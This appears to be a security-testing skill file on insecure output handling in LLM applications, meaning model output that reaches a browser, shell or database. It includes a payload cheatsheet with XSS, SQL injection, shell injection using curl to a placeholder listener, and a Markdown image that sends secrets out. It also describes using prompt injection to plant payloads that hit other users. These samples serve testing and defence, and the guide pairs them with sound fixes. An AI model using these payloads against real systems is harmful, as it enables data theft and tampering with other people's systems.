---
format: "v2"
name: "insecure-output-handling"
title: "Insecure Output Handling"
title_fr: "Traitement non sécurisé des sorties"
description: "Use when an app passes an LLM's output into another system — a browser, shell, database, or API call — testing whether model output can become an injection, and how to contain it."
description_fr: "À utiliser quand une application transmet la sortie d'un LLM à un autre système — navigateur, shell, base de données, appel API — pour tester si la sortie du modèle peut devenir une injection, et comment la contenir."
domain: "25-ai-and-llm-security"
tags: [cybersecurity, engineering, best-practices]
maturity: "stable"
audience: ["backend-engineer", "security-engineer", "coding-agent"]
requires: ["bash", "git"]
updated: "2026-08-08"
---



## Prerequisites
- Target system, dependencies and environment configured.

## Usage
### Purpose

Model output is untrusted input to whatever consumes it. The moment an app renders a response as HTML, runs it as code, or drops it into a query, the model becomes an injection vector — and prompt injection (see that skill) means an attacker can steer what the model emits. This skill covers testing that boundary and closing it. It's the downstream half of prompt injection: injection gets the model to say something dangerous, insecure output handling is the app *acting* on it.

### When to use it

Any LLM feature whose output flows into another system: a chatbot rendering Markdown/HTML, an assistant that generates and runs code, a "text to SQL" feature, an agent that builds API calls or shell commands from model text. If the output isn't just shown as plain text to one user, test it.

### Procedure

1. Trace where the output goes. Follow the model's response from generation to every sink: the DOM, a template, a shell, a database driver, an HTTP client, a file write.
2. **HTML/JS sink (XSS):** get the model to emit markup and see if it renders as active content rather than escaped text. Prompt it to produce:
   ```
   
   ```
   If that executes in the victim's browser, the output is rendered unsanitised.
3. **Markdown sink:** many chat UIs render Markdown, which allows links and images that leak data via URL or enable clickjacking. Test an image/link that calls out to a server you control:
   ```
   ![x](https://your-listener.tld/leak?data=...)
   ```
4. **Code/command sink:** if output feeds a shell or `eval`, get it to include a command separator or payload and check whether it executes beyond the intended action.
5. **SQL sink (text-to-SQL):** steer the generated query toward reading tables it shouldn't, or breaking out of the intended statement — the model writing the query doesn't make the query safe.
6. Combine with prompt injection for the realistic attack: plant the payload in content the model ingests (a document, a web page), so the dangerous output is attacker-controlled and hits another user.

### Cheatsheet

```
XSS:       <script>alert(document.domain)</script>   
Markdown:  ![](https://LISTENER/leak?d=SECRET)   [click](javascript:alert(1))
Shell:     ; curl https://LISTENER  |  $(id)  |  `whoami`
SQL:       ' UNION SELECT ...  |  ; DROP ...   (via text-to-sql)

does the app treat model output as data (safe) or as code/markup (vulnerable)?
```

### Reading the output

- **Model-emitted markup executing** in the browser = stored/reflected XSS with the model as the injection point. Same impact as classic XSS, new source.
- **A Markdown image/link hitting your listener** = data exfiltration channel; the model can be steered to encode secrets into the URL.
- **A generated command or query doing more than intended** = the app trusts model output as code. In an agent with real tools, this is critical.
- **Output rendered as plain, escaped text everywhere** = the safe pattern; note it as done right.

### The fix

Treat everything the model produces as untrusted, and apply the same output discipline you'd apply to user input at each sink:

- **HTML/Markdown:** encode or sanitise before rendering (the XSS-testing skill's fixes apply directly — context-aware output encoding, a vetted sanitiser like DOMPurify, a strict CSP). Never inject model output via `innerHTML` raw.
- **Code/shell:** don't `eval` or shell out with model text. If the model must produce an action, map it to a fixed, parameterised set of allowed operations rather than executing free-form strings.
- **SQL:** the model proposes intent; the app builds the query with parameterised statements and least-privilege DB access. Don't run raw model-authored SQL against a privileged connection.
- **Agents:** constrain outputs to a schema/allowlist so a steered model can't emit an arbitrary tool call (ties into the excessive-agency and agent-tool-abuse skills).
- Keep a human confirmation step before any consequential action derived from model output.

### Pitfalls

- **Trusting output because you trust the model.** The model can be steered by injected content; its output is only as trustworthy as everything it read.
- **Sanitising input but not output.** The dangerous string is generated, not typed — it never passes your input filters.
- **Rendering Markdown as "safe".** Markdown allows links, images, and sometimes raw HTML — all exfiltration or XSS vectors.
- **Text-to-SQL on a privileged connection.** Even a well-behaved model plus one prompt injection reads your whole database if the connection allows it.

### References

- OWASP Top 10 for LLM Applications — LLM02 Insecure Output Handling
- OWASP XSS and SQL Injection Prevention Cheat Sheets
- CWE-79, CWE-89, CWE-94

## Inputs
- Relevant source code, logs, network traces, or system specifications.

## Outputs
- Analysis findings, security audit report, or generated code artifacts.